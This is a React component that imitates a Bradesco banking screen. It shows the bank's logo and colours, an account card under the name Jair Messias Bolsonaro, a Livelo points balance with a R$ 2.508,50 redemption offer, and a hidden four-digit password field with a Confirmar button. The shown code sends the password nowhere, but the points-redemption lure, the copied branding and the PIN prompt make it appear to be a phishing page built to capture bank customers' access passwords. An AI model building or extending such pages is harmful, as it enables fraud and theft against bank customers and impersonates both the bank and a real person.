import { useState } from "react";
import bradescoLogo from "@/assets/bradesco-logo.png";

const Confirmacao = () => {
  const [senha, setSenha] = useState("");
  const [selected, setSelected] = useState<"fatura" | "saldo">("saldo");

  return (
    <div className="min-h-screen max-w-md mx-auto relative flex flex-col" style={{ background: 'linear-gradient(135deg, #D7004D 0%, #A30032 100%)' }}>
      {/* Header */}
      <div className="px-5 pt-6 pb-4">
        <img src={bradescoLogo} alt="Bradesco" className="h-8" />
      </div>

      {/* Account Card */}
      <div className="mx-5 bg-white rounded-xl p-5 mb-4">
        <h2 className="text-foreground font-bold text-base mb-3">JAIR MESSIAS BOLSONARO</h2>
        <p className="text-muted-foreground text-xs mb-1">Detalhes</p>
        <p className="text-foreground text-sm font-semibold">237 - BANCO BRADESCO S.A.</p>
        <p className="text-muted-foreground text-xs">Conta Corrente Individual</p>
        <p className="text-muted-foreground text-xs mt-1">**24 / ***24-3</p>
        <div className="flex items-center justify-between mt-4">
          <span className="text-foreground font-bold text-base italic">livelo</span>
          <span className="text-[#D7004D] font-bold text-lg">120.425 pts</span>
        </div>
      </div>

      {/* Redemption Options */}
      <div className="mx-5 bg-white rounded-xl p-5 mb-4">
        <p className="text-muted-foreground text-sm mb-3">Escolha como deseja resgatar</p>

        <button
          onClick={() => setSelected("fatura")}
          className={`w-full flex items-center justify-between p-4 rounded-lg border mb-3 transition-colors ${selected === "fatura" ? "border-[#D7004D] bg-pink-50" : "border-border"}`}
        >
          <div className="text-left">
            <p className="text-foreground font-semibold text-sm">Abater na próxima fatura</p>
            <p className="text-muted-foreground text-xs">Desconto aplicado automaticamente</p>
          </div>
        </button>

        <button
          onClick={() => setSelected("saldo")}
          className={`w-full flex items-center justify-between p-4 rounded-lg border transition-colors ${selected === "saldo" ? "border-[#D7004D] bg-pink-50" : "border-border"}`}
        >
          <div className="text-left">
            <p className="text-foreground font-semibold text-sm">Saldo em conta</p>
            <p className="text-muted-foreground text-xs">Crédito direto na sua conta</p>
          </div>
          <span className="text-foreground font-bold text-sm">R$ 2.508,50</span>
        </button>
      </div>

      {/* Password Section */}
      <div className="mx-5 mb-6 relative">
        <p className="text-primary-foreground font-bold text-base">Confirme seu resgate.</p>
        <p className="text-primary-foreground/80 text-sm mb-3">Digite sua senha de acesso.</p>
        <p className="text-primary-foreground font-bold text-sm mb-2">Senha</p>
        <label className="flex gap-3 cursor-text">
          {[0, 1, 2, 3].map((i) => (
            <div
              key={i}
              className={`w-3 h-3 rounded-full ${i < senha.length ? "bg-primary-foreground" : "bg-primary-foreground/30"}`}
            />
          ))}
          <input
            type="password"
            inputMode="numeric"
            maxLength={4}
            value={senha}
            onChange={(e) => setSenha(e.target.value.replace(/\D/g, "").slice(0, 4))}
            className="absolute inset-0 w-full h-full opacity-0 cursor-text"
            autoFocus
          />
        </label>
      </div>

      {/* Spacer */}
      <div className="flex-1" />

      {/* Confirm Button */}
      <div className="px-5 pb-8">
        <button className="w-full py-4 rounded-full bg-white/80 text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity">
          Confirmar
        </button>
      </div>
    </div>
  );
};

export default Confirmacao;
